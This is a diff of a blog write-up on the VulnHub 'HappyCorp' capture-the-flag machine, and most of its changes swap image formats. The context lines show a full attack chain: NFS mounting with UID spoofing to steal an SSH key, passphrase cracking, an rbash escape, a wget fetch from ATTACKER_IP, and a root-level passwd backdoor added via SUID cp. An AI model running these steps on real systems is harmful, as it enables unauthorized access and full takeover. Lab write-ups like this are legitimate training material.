@@ -8,7 +8,7 @@ categories: ["writeups"]
 series: []
 showToc: true
 cover:
-  image: "https://cdn.ziomsec.com/happycorp/cover.png"
+  image: "https://cdn.ziomsec.com/happycorp/cover.webp"
   caption: "HappyCorp VulnHub Challenge"
   alt: "HappyCorp cover"
 platform: "VulnHub"
@@ -43,8 +43,8 @@ nmap -A -p- 192.168.1.11 -T5 -oN nmap.out
 | 45633    | *dynamically assigned* |
 | 47619    | *dynamically assigned* |
 
-![](https://cdn.ziomsec.com/happycorp/1.png)
-![](https://cdn.ziomsec.com/happycorp/2.png)
+![](https://cdn.ziomsec.com/happycorp/1.webp)
+![](https://cdn.ziomsec.com/happycorp/2.webp)
 
 ## Initial Foothold
 
@@ -56,7 +56,7 @@ The **nmap** aggressive scan revealed an endpoint inside the *robots.txt*. I vis
 curl http://192.168.1.11/admin.php
 ```
 
-![](https://cdn.ziomsec.com/happycorp/3.png)
+![](https://cdn.ziomsec.com/happycorp/3.webp)
 
 So, I moved onto the next port, which is 2049 (**nfs**).
 
@@ -66,7 +66,7 @@ I viewed mounted directories using **showmount**
 showmount -e 192.168.1.11
 ```
 
-![](https://cdn.ziomsec.com/happycorp/4.png)
+![](https://cdn.ziomsec.com/happycorp/4.webp)
 
 The above command revealed that the directory of user *karl* was mounted. To access it, I mounted a temporary directory from my local system and viewed the contents present inside *karl*
 
@@ -76,9 +76,9 @@ mount -t nfs 192.168.1.11:/home/karl rick
 ls -la rick
 ```
 
-![](https://cdn.ziomsec.com/happycorp/5.png)
+![](https://cdn.ziomsec.com/happycorp/5.webp)
 
-![](https://cdn.ziomsec.com/happycorp/6.png)
+![](https://cdn.ziomsec.com/happycorp/6.webp)
 
 I found the *.ssh* file. This file contains the authentication related information about a particular user. If I could read it's contents (private key), I could log into the system as *karl*. 
 
@@ -89,13 +89,13 @@ useradd --uid 1001 kratos
 su kratos
 ```
 
-![](https://cdn.ziomsec.com/happycorp/7.png)
+![](https://cdn.ziomsec.com/happycorp/7.webp)
 
 I then viewed the contents inside the *.ssh* folder and found the first flag.
 
-![](https://cdn.ziomsec.com/happycorp/8.png)
+![](https://cdn.ziomsec.com/happycorp/8.webp)
 
-![](https://cdn.ziomsec.com/happycorp/9.png)
+![](https://cdn.ziomsec.com/happycorp/9.webp)
 
 I copied the entire *.ssh* folder on my local system at the */tmp* directory.
 
@@ -103,13 +103,13 @@ I copied the entire *.ssh* folder on my local system at the */tmp* directory.
 cp -r .ssh /tmp
 ```
 
-![](https://cdn.ziomsec.com/happycorp/10.png)
+![](https://cdn.ziomsec.com/happycorp/10.webp)
 
-![](https://cdn.ziomsec.com/happycorp/11.png)
+![](https://cdn.ziomsec.com/happycorp/11.webp)
 
 I then viewed the private key (**id_rsa**) and found out that it was encrypted with a password.
 
-![](https://cdn.ziomsec.com/happycorp/12.png)
+![](https://cdn.ziomsec.com/happycorp/12.webp)
 
 I then attempted to crack the password using **john** and *rockyou.txt* wordlist. To make the file crackable for **john**, I used the **ssh2john** utility.
 
@@ -118,7 +118,7 @@ ssh2john id_rsa > karl.hash
 john karl.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![](https://cdn.ziomsec.com/happycorp/13.png)
+![](https://cdn.ziomsec.com/happycorp/13.webp)
 
 I was able to crack the password and used it to log into the target with *karl*'s private key. However, upon logging in, I was provided with an **rbash** (I had restrictions on the commands that I could execute)
 
@@ -127,7 +127,7 @@ ssh -i /tmp/.ssh/id_rsa karl@192.168.1.11
 # enter password when prompted
 ```
 
-![](https://cdn.ziomsec.com/happycorp/14.png)
+![](https://cdn.ziomsec.com/happycorp/14.webp)
 
 ### Escaping RBash
 
@@ -137,7 +137,7 @@ To break out of **rbash**, I manually specified the shell that I wanted while lo
 ssh -i /tmp/.ssh/id_rsa karl@192.168.1.11 -t /bin/bash
 ```
 
-![](https://cdn.ziomsec.com/happycorp/15.png)
+![](https://cdn.ziomsec.com/happycorp/15.webp)
 
 ## Privilege Escalation
 
@@ -160,11 +160,11 @@ wget http://ATTACKER_IP:8888/lse.sh
 
 Finally, I ran the script:
 
-![](https://cdn.ziomsec.com/happycorp/16.png)
+![](https://cdn.ziomsec.com/happycorp/16.webp)
 
 The script discovered an SUID bit in the **cp** command.
 
-![](https://cdn.ziomsec.com/happycorp/17.png)
+![](https://cdn.ziomsec.com/happycorp/17.webp)
 
 I also verified this manually.
 
@@ -172,7 +172,7 @@ I also verified this manually.
 find / -user root -perm -u=s -ls 2>/dev/null
 ```
 
-![](https://cdn.ziomsec.com/happycorp/18.png)
+![](https://cdn.ziomsec.com/happycorp/18.webp)
 
 So, I was allowed to copy a file with root privileges. Now, I could move onto privilege escalation.
 
@@ -186,11 +186,11 @@ To create a key-pair, I executed the following on my local system:
 ssh-keygen -t rsa -b 4096 -C "NAME"
 ```
 
-![](https://cdn.ziomsec.com/happycorp/19.png)
+![](https://cdn.ziomsec.com/happycorp/19.webp)
 
 I copied my public key and pasted it into the victim machine.
 
-![](https://cdn.ziomsec.com/happycorp/20.png)
+![](https://cdn.ziomsec.com/happycorp/20.webp)
 
 ```shell
 cd tmp
@@ -199,7 +199,7 @@ cd .ssh
 echo KEY > authorized_keys
 ```
 
-![](https://cdn.ziomsec.com/happycorp/21.png)
+![](https://cdn.ziomsec.com/happycorp/21.webp)
 
 Finally, I copied the *.ssh* folder into the root directory.
 
@@ -213,7 +213,7 @@ Now, I could log into the system as root user:
 ssh root@192.168.1.11
 ```
 
-![](https://cdn.ziomsec.com/happycorp/22.png)
+![](https://cdn.ziomsec.com/happycorp/22.webp)
 
 ### Exploitation - Creating A New User
 
@@ -226,7 +226,7 @@ cd rick
 cp /etc/passwd /root/ctf/happycorp
 ```
 
-![](https://cdn.ziomsec.com/happycorp/23.png)
+![](https://cdn.ziomsec.com/happycorp/23.webp)
 
 I then created a new user with username **nemesis** and password **bypass**.
 
@@ -236,7 +236,7 @@ openssl passwd -1 -salt mimir bypass
 ```
 > `-1` indicates MD5 hash and the `-salt` option specifies the salt to use for the hash. In the above case, the salt is *mimir*.
 
-![](https://cdn.ziomsec.com/happycorp/24.png)
+![](https://cdn.ziomsec.com/happycorp/24.webp)
 
 I then appended the following into the *passwd* file that I had copied.
 
@@ -244,7 +244,7 @@ I then appended the following into the *passwd* file that I had copied.
 echo 'nemesis:$1$mimir$mU/..cXck3dFQW1wl98mT:0:0:root:/root:/bin/bash' >> passwd
 ```
 
-![](https://cdn.ziomsec.com/happycorp/25.png)
+![](https://cdn.ziomsec.com/happycorp/25.webp)
 
 I transferred the file back into the main system and moved it into the intended directory. 
 
@@ -270,7 +270,7 @@ root@happycorp:/home/karl/tmp#
 
 I then moved into the *root* directory and captured the second flag.
 
-![](https://cdn.ziomsec.com/happycorp/27.png)
+![](https://cdn.ziomsec.com/happycorp/26.webp)
 
 ## Closure
 
